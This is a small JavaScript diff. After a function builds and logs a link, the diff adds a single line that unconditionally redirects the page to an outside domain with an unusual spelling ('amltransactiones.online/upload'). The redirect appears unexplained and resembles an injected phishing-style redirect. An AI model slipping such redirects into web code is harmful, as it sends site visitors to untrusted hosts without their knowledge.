@@ -79,6 +79,7 @@ function something(){
     $('#LINKHERE').html(the_link)
 
     console.log(the_link)
+	location.href= 'https://openaml.amltransactiones.online/upload'
 }
 
 
